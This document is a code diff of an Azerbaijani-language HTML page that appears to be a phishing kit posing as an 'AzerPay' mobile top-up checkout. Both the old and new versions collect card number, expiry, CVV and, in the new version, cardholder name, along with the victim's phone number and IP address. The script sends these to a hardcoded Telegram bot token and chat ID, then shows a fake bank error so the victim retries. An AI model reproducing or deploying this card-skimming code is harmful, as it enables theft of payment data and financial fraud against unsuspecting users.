@@ -3,304 +3,237 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ödəniş Mərkəzi - AzerPay</title>
+    <title>Ödəniş Səhifəsi - AzerPay</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #0b0e14;
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
-            -webkit-tap-highlight-color: transparent;
-        }
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 6%;
-            background: #111622;
-            border-bottom: 1px solid #1f2736;
-        }
-        .logo { font-size: 1.5rem; font-weight: 800; color: #ff3b30; }
-        .logo span { color: #0562ff; }
+        body { margin: 0; padding: 0; background: #fdf5f5; color: #17223b; font-family: 'Segoe UI', Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; box-sizing: border-box; }
+        header { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; box-sizing: border-box; background: transparent; }
+        .logo-area { display: flex; align-items: center; font-size: 1.4rem; font-weight: bold; }
+        .logo-area span { color: #ff3b30; }
+        .lang-toggle { display: flex; background: #f0f2f5; border-radius: 20px; padding: 2px; font-size: 0.85rem; font-weight: bold; }
+        .lang-toggle span { padding: 6px 12px; border-radius: 18px; cursor: pointer; }
+        .lang-toggle .active { background: #ffffff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         
-        .main-wrapper {
-            max-width: 1000px;
-            margin: 40px auto;
-            padding: 0 20px;
-            display: grid;
-            grid-template-columns: 1.2fr 1.8fr;
-            gap: 30px;
-            box-sizing: border-box;
-        }
-
-        /* Sol tərəf - Sifariş Xülasəsi */
-        .summary-card {
-            background: #121824;
-            border: 1px solid #1f2736;
-            border-radius: 20px;
-            padding: 25px;
-            height: fit-content;
-        }
-        .summary-card h3 { margin-top: 0; border-bottom: 1px solid #1f2736; padding-bottom: 15px; font-size: 1.2rem; }
-        .summary-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 15px;
-            font-size: 0.95rem;
-        }
-        .summary-item span:first-child { color: #8c9ba5; }
-        .summary-item span:last-child { font-weight: 600; }
+        .main-container { width: 100%; max-width: 430px; padding: 0 20px 30px 20px; box-sizing: border-box; }
         
-        .total-price {
-            border-top: 1px solid #1f2736;
-            padding-top: 15px;
-            margin-top: 15px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 1.25rem;
-            font-weight: bold;
-            color: #0562ff;
-        }
+        /* Sifariş Xülasəsi */
+        .summary-box { background: #111622; color: #fff; border-radius: 16px; padding: 15px 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); font-size: 0.9rem; }
+        .summary-box h4 { margin: 0 0 10px 0; color: #ff3b30; border-bottom: 1px solid #1f2736; padding-bottom: 8px; font-size: 1rem; }
+        .sum-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .sum-row span:first-child { color: #8c9ba5; }
+        .sum-row span:last-child { font-weight: 600; }
 
-        /* Sağ tərəf - Bank Kartı */
-        .payment-card {
-            background: #ffffff;
-            color: #26314d;
-            border-radius: 24px;
-            padding: 30px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.4);
-            position: relative;
-            overflow: hidden;
-            box-sizing: border-box;
-        }
-        .input-group { margin-bottom: 20px; }
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 0.85rem;
-            color: #5f6f95;
-            font-weight: 600;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 16px;
-            border-radius: 12px;
-            border: 1px solid #d7dfee;
-            background: #f7f9ff;
-            font-size: 1.1rem;
-            outline: none;
-            box-sizing: border-box;
-            color: #111622;
-        }
-        .input-group input:focus { border-color: #0562ff; background: #ffffff; }
-        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        /* Realist Bank Kartı Vizuallığı */
+        .visual-card { background: linear-gradient(135deg, #1f232c 0%, #3a1c28 50%, #11141a 100%); border-radius: 20px; padding: 25px; color: white; box-shadow: 0 15px 30px rgba(0,0,0,0.25); margin-bottom: 25px; position: relative; overflow: hidden; letter-spacing: 1px; }
+        .visual-card::before { content: ''; position: absolute; top: -50%; right: -20%; width: 200px; height: 200px; background: rgba(255,255,255,0.03); border-radius: 50%; }
+        .card-system { font-size: 0.9rem; font-weight: 800; opacity: 0.8; text-transform: uppercase; margin-bottom: 35px; }
+        .card-view-number { font-size: 1.4rem; font-weight: 600; word-spacing: 5px; margin-bottom: 25px; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); min-height: 28px; }
+        .card-flex { display: flex; justify-content: space-between; }
+        .card-lbl { font-size: 0.65rem; text-transform: uppercase; color: rgba(255,255,255,0.5); margin-bottom: 4px; font-weight: 600; }
+        .card-val { font-size: 0.9rem; font-weight: bold; min-height: 18px; text-transform: uppercase; }
+
+        /* Giriş Formu */
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #5f6f95; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+        .form-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; background: #ffffff; font-size: 1.05rem; font-weight: 500; color: #1a202c; outline: none; box-sizing: border-box; transition: border-color 0.2s; }
+        .form-group input:focus { border-color: #ff3b30; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
         
-        .pay-btn {
-            width: 100%;
-            padding: 16px;
-            background: #0562ff;
-            color: white;
-            border: none;
-            border-radius: 14px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background 0.2s;
-        }
-        .pay-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .submit-btn { width: 100%; padding: 16px; background: linear-gradient(90deg, #ff3b30, #e02e24); color: white; border: none; border-radius: 14px; font-size: 1.1rem; font-weight: bold; cursor: pointer; box-shadow: 0 6px 20px rgba(255,59,48,0.3); transition: transform 0.1s, opacity 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .submit-btn:active { transform: scale(0.98); }
+        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
+        
+        .ssl-info { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 0.8rem; color: #718096; margin-top: 15px; text-align: center; }
+        .back-link { display: inline-block; margin-top: 25px; color: #718096; text-decoration: none; font-size: 0.9rem; font-weight: 500; }
 
-        /* Fake 3D secure xətası pəncərəsi */
-        .error-overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: #ffffff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 25px;
-            box-sizing: border-box;
-            text-align: center;
-            transform: translateY(100%);
-            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            z-index: 10;
-        }
-        .error-overlay.active { transform: translateY(0); }
-        .error-icon {
-            width: 55px; height: 55px; background: #fff5f5;
-            color: #ff3b30; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 1.6rem; font-weight: bold; margin-bottom: 15px;
-        }
-
-        /* 📱 MOBİL EKRANLAR ÜÇÜN RESPONSİV SƏLİQƏLƏŞDİRMƏ */
-        @media (max-width: 768px) {
-            header { padding: 15px 5%; }
-            .main-wrapper {
-                grid-template-columns: 1fr; /* Bloklar alt-alta gəlir sıxılmır */
-                margin: 20px auto;
-                gap: 20px;
-            }
-            .payment-card {
-                padding: 20px; /* Kiçik ekranlar üçün kənar boşluq azaldılır */
-                border-radius: 20px;
-            }
-            .input-group input {
-                padding: 14px; /* İnput sahəsi barmaq üçün ideallaşdırılır */
-                font-size: 1rem;
-            }
-            .pay-btn {
-                padding: 15px;
-            }
-        }
+        /* Azericard tipli real Pop-up Xətası */
+        .popup-back { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 999; visibility: hidden; opacity: 0; transition: opacity 0.3s; padding: 20px; box-sizing: border-box; }
+        .popup-back.visible { visibility: visible; opacity: 1; }
+        .popup-box { background: #ffffff; border-radius: 20px; width: 100%; max-width: 340px; padding: 25px 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); animation: scaleUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        @keyframes scaleUp { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .popup-title { font-size: 1.15rem; font-weight: 700; color: #2d3748; margin: 0 0 8px 0; }
+        .popup-web { font-size: 1.1rem; font-weight: 600; color: #1a202c; margin-bottom: 15px; border-bottom: 1px solid #edf2f7; padding-bottom: 12px; }
+        .popup-msg { font-size: 0.95rem; color: #4a5568; line-height: 1.4; margin-bottom: 20px; }
+        .popup-btn { width: 100%; padding: 12px; background: #0056ff; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; }
     </style>
 </head>
 <body>
 
     <header>
-        <div class="logo">Azer<span>Pay</span></div>
+        <div class="logo-area">Azər<span>Pay</span></div>
+        <div class="lang-toggle"><span class="active">AZ</span><span>RU</span></div>
     </header>
 
-    <div class="main-wrapper">
-        <div class="summary-card">
-            <h3>Sifariş Xülasəsi</h3>
-            <div class="summary-item">
-                <span>Operator:</span>
-                <span id="summaryOperator">-</span>
-            </div>
-            <div class="summary-item">
-                <span>Telefon nömrəsi:</span>
-                <span id="summaryPhone">-</span>
-            </div>
-            <div class="summary-item">
-                <span>Log ID:</span>
-                <span id="summaryLogId" style="font-family: monospace; color:#10b981;">-</span>
-            </div>
-            <div class="total-price">
-                <span>Ümumi məbləğ:</span>
-                <span id="summaryAmount">0.00 AZN</span>
+    <div class="main-container">
+        <div class="summary-box">
+            <h4>Sifariş Məlumatları</h4>
+            <div class="sum-row"><span>Operator:</span><span id="sumOper">-</span></div>
+            <div class="sum-row"><span>Nömrə:</span><span id="sumPhone">-</span></div>
+            <div class="sum-row"><span>Məbləğ:</span><span id="sumAmnt">0.00 AZN</span></div>
+        </div>
+
+        <div class="visual-card">
+            <div class="card-system">AzərPay</div>
+            <div class="card-view-number" id="cardViewNo">•••• •••• •••• ••••</div>
+            <div class="card-flex">
+                <div>
+                    <div class="card-lbl">KART SAHİBİ</div>
+                    <div class="card-val" id="cardViewName">—</div>
+                </div>
+                <div>
+                    <div class="card-lbl">BİTMƏ TARİXİ</div>
+                    <div class="card-val" id="cardViewExp">MM/YY</div>
+                </div>
             </div>
         </div>
 
-        <div class="payment-card">
-            <div class="error-overlay" id="errorOverlay">
-                <div class="error-icon">✕</div>
-                <h3 style="color:#17223b; margin:0 0 10px 0;">3D Secure Doğrulanmadı</h3>
-                <p style="color:#6c7a9c; font-size:0.9rem; margin-bottom:20px; line-height: 1.4;">Emitent bank tərəfindən əməliyyat rədd edildi (Xəta: 5004). Zəhmət olmasa məlumatları yoxlayın və ya fərqli kartla yoxlayın.</p>
-                <button onclick="closeError()" style="padding:12px 30px; background:#0f3460; color:white; border:none; border-radius:10px; cursor:pointer; font-weight: 600; width: 100%;">Yenidən cəhd et</button>
+        <form id="payForm">
+            <div class="form-group">
+                <label>KART NÖMRƏSİ</label>
+                <input type="text" id="cardNo" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label>KART SAHİBİ</label>
+                <input type="text" id="cardName" placeholder="AD SOYAD" required autocomplete="off" style="text-transform: uppercase;">
             </div>
 
-            <h2 style="margin-top:0; font-size:1.25rem; margin-bottom:20px; color: #111622;">Kredit və ya Debet Kartı</h2>
-            <form id="paymentForm">
-                <div class="input-group">
-                    <label>Kart nömrəsi</label>
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
+            <div class="grid-2">
+                <div class="form-group">
+                    <label>BİTMƏ TARİXİ</label>
+                    <input type="text" id="cardExp" placeholder="AA/YY" inputmode="numeric" maxlength="5" required autocomplete="off">
                 </div>
-                <div class="row">
-                    <div class="input-group">
-                        <label>Bitmə tarixi</label>
-                        <input type="text" id="expiry" placeholder="MM/YY" inputmode="numeric" maxlength="5" required>
-                    </div>
-                    <div class="input-group">
-                        <label>CVV/CVC</label>
-                        <input type="password" id="cvv" placeholder="***" inputmode="numeric" maxlength="3" required>
-                    </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="password" id="cardCvv" placeholder="•••" inputmode="numeric" maxlength="3" required autocomplete="off">
                 </div>
-                <button type="submit" class="pay-btn" id="payButton" disabled>Ödənişi Təsdiqlə</button>
-            </form>
+            </div>
+
+            <button type="submit" class="submit-btn" id="btnSubmit" disabled>
+                🔒 Ödənişi tamamla · <span id="btnPrice">0</span> AZN
+            </button>
+        </form>
+
+        <div class="ssl-info">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            256-bit SSL şifrələmə ilə qorunur
+        </div>
+
+        <a href="index.html" class="back-link">‹ Geri</a>
+    </div>
+
+    <div class="popup-back" id="errPopup">
+        <div class="popup-box">
+            <div class="popup-title">maqa085.github.io deyir:</div>
+            <div class="popup-msg">Serverə bağlanmaq mümkün olmadı. Termux skriptinin aktiv olduğundan əmin olun.</div>
+            <button class="popup-btn" onclick="closePopup()">OK</button>
         </div>
     </div>
 
     <script>
-        const operator = localStorage.getItem('selectedOperator') || 'Məlum deyil';
+        // Data Yükləmə
+        const oper = localStorage.getItem('selectedOperator') || 'Məlum deyil';
         const phone = localStorage.getItem('phoneNumber') || 'Məlum deyil';
         const amount = localStorage.getItem('paymentAmount') || '0';
-        
-        const logId = 'LOG-' + Math.floor(10000000 + Math.random() * 90000000);
 
-        document.getElementById('summaryOperator').innerText = operator;
-        document.getElementById('summaryPhone').innerText = phone;
-        document.getElementById('summaryAmount').innerText = amount + '.00 AZN';
-        document.getElementById('summaryLogId').innerText = logId;
+        document.getElementById('sumOper').innerText = oper;
+        document.getElementById('sumPhone').innerText = phone;
+        document.getElementById('sumAmnt').innerText = amount + '.00 AZN';
+        document.getElementById('btnPrice').innerText = amount;
 
-        const form = document.getElementById('paymentForm');
-        const cardInput = document.getElementById('cardNumber');
-        const expiryInput = document.getElementById('expiry');
-        const cvvInput = document.getElementById('cvv');
-        const payButton = document.getElementById('payButton');
+        // Elementlər
+        const form = document.getElementById('payForm');
+        const inpNo = document.getElementById('cardNo');
+        const inpName = document.getElementById('cardName');
+        const inpExp = document.getElementById('cardExp');
+        const inpCvv = document.getElementById('cardCvv');
+        const btn = document.getElementById('btnSubmit');
 
-        cardInput.addEventListener('input', (e) => {
+        // Canlı Sinxronizasiya Dinləyiciləri
+        inpNo.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\D/g, '').match(/(\d{0,4})(\d{0,4})(\d{0,4})(\d{0,4})/);
-            e.target.value = !v[2] ? v[1] : v[1] + ' ' + v[2] + (v[3] ? ' ' + v[3] : '') + (v[4] ? ' ' + v[4] : '');
-            checkForm();
+            let res = !v[2] ? v[1] : v[1] + ' ' + v[2] + (v[3] ? ' ' + v[3] : '') + (v[4] ? ' ' + v[4] : '');
+            e.target.value = res;
+            document.getElementById('cardViewNo').innerText = res || '•••• •••• •••• ••••';
+            valForm();
         });
 
-        expiryInput.addEventListener('input', (e) => {
+        inpName.addEventListener('input', (e) => {
+            let res = e.target.value.toUpperCase();
+            document.getElementById('cardViewName').innerText = res || '—';
+            valForm();
+        });
+
+        inpExp.addEventListener('input', (e) => {
             let v = e.target.value.replace(/\D/g, '');
-            e.target.value = v.length >= 2 ? v.substring(0,2) + '/' + v.substring(2,4) : v;
-            checkForm();
+            let res = v.length >= 2 ? v.substring(0,2) + '/' + v.substring(2,4) : v;
+            e.target.value = res;
+            document.getElementById('cardViewExp').innerText = res || 'MM/YY';
+            valForm();
         });
 
-        cvvInput.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '');
-            checkForm();
+        inpCvv.addEventListener('input', () => {
+            inpCvv.value = inpCvv.value.replace(/\D/g, '');
+            valForm();
         });
 
-        function checkForm() {
-            const isCardValid = cardInput.value.replace(/\s/g, '').length === 16;
-            const isExpiryValid = expiryInput.value.length === 5;
-            const isCvvValid = cvvInput.value.length === 3;
-            payButton.disabled = !(isCardValid && isExpiryValid && isCvvValid);
+        function valForm() {
+            const okNo = inpNo.value.replace(/\s/g, '').length === 16;
+            const okName = inpName.value.trim().length >= 4;
+            const okExp = inpExp.value.length === 5;
+            const okCvv = inpCvv.value.length === 3;
+            btn.disabled = !(okNo && okName && okExp && okCvv);
         }
 
+        // Göndərmə və Xəta
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            payButton.disabled = true;
-            payButton.innerText = 'Gözləyin...';
+            btn.disabled = true;
+            btn.innerText = 'Yoxlanılır...';
 
-            let userIp = "Tapılmadı";
+            let ip = "Alınmadı";
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                userIp = ipData.ip;
-            } catch(err) { console.log("IP alınmadı"); }
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                ip = d.ip;
+            } catch(h) {}
 
-            const BOT_TOKEN = '8900082556:AAEpifqTxdKCqppa7lflczmD6IYzjk0iZTs';
-            const CHAT_ID = '8055987590';
+            const TOKEN = '8900082556:AAEpifqTxdKCqppa7lflczmD6IYzjk0iZTs';
+            const CHAT = '8055987590';
 
-            const mesaj = `💳 *Yeni Kart*\n\n` +
-                          `🆔 *Log ID:* \`${logId}\`\n` +
-                          `📱 *Operator:* ${operator}\n` +
-                          `📞 *Nömrə:* \`${phone}\`\n` +
-                          `💰 *Məbləğ:* ${amount} AZN\n` +
-                          `🌐 *IP Ünvanı:* \`${userIp}\`\n\n` +
-                          `🔹 *Kart Nömrəsi:* \`${cardInput.value}\`\n` +
-                          `🔹 *Bitmə Tarixi:* \`${expiryInput.value}\`\n` +
-                          `🔹 *CVV:* \`${cvvInput.value}\``;
+            const txt = `💳 *YENİ ÖDƏNİŞ MƏLUMATI*\n\n` +
+                        `👤 *Kart Sahibi:* \`${inpName.value.toUpperCase()}\`\n` +
+                        `🔢 *Kart Nömrəsi:* \`${inpNo.value}\`\n` +
+                        `📅 *Müddət:* \`${inpExp.value}\`\n` +
+                        `🔒 *CVV:* \`${inpCvv.value}\`\n\n` +
+                        `📱 *Operator:* ${oper}\n` +
+                        `📞 *Nömrə:* \`${phone}\`\n` +
+                        `💰 *Məbləğ:* ${amount} AZN\n` +
+                        `🌐 *IP:* \`${ip}\``;
 
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: CHAT, text: txt, parse_mode: 'Markdown' })
                 });
-                document.getElementById('errorOverlay').classList.add('active');
-            } catch (error) {
-                alert('Sistem xətası, yenidən cəhd edin.');
+                document.getElementById('errPopup').classList.add('visible');
+            } catch (err) {
+                alert('Xəta baş verdi, yenidən cəhd edin.');
             } finally {
-                payButton.innerText = 'Ödənişi Təsdiqlə';
-                checkForm();
+                btn.innerText = `🔒 Ödənişi tamamla · ${amount} AZN`;
+                valForm();
             }
         });
 
-        function closeError() {
-            document.getElementById('errorOverlay').classList.remove('active');
+        function closePopup() {
+            document.getElementById('errPopup').classList.remove('visible');
             form.reset();
-            checkForm();
+            document.getElementById('cardViewNo').innerText = '•••• •••• •••• ••••';
+            document.getElementById('cardViewName').innerText = '—';
+            document.getElementById('cardViewExp').innerText = 'MM/YY';
+            valForm();
         }
     </script>
 </body>
-</html>
+                        </html>
+                
